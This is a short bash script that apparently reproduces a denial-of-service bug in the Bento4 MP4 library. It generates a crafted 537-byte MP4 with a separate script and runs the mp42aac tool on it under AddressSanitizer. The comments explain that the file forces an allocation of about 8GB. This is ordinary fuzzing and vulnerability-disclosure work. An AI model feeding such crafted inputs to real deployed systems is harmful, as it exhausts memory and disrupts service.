#!/bin/bash
set -e
POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4FragmentSampleTable_cpp"
cd "$POC_DIR"
python3 "$POC_DIR/vuln_001_gen.py"

# Run mp42aac with ASAN.
# On 64-bit with overcommit, ::operator new for 8GB (0x20000000 * sizeof(Entry))
# does not throw bad_alloc but instead exhausts RAM.
# hard_rss_limit_mb=512 makes ASAN abort when the process exceeds 512MB RSS,
# demonstrating the DoS: a 537-byte input causes 500MB+ memory consumption.
# abort_on_error=1 ensures the process actually aborts (exit 134) on the RSS limit.
ASAN_OPTIONS="abort_on_error=1:log_path=$POC_DIR/asan_001.log:hard_rss_limit_mb=512" \
  /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac \
  "$POC_DIR/vuln_001.mp4" /dev/null \
  > "$POC_DIR/vuln_001_result.txt" 2>&1 || true

# grep ASAN/UBSAN errors from log files
for f in "$POC_DIR"/asan_001.log.*; do
  [ -f "$f" ] && grep -E "(ERROR|WARNING|runtime error|rss limit|bad_alloc|terminate)" "$f" >> "$POC_DIR/vuln_001_result.txt" 2>/dev/null || true
done
echo "=== mp42aac exit ===" >> "$POC_DIR/vuln_001_result.txt"
